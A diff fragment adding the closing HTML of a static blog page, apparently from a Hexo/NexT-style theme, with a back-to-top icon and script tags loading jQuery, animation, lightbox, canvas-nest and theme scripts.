+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
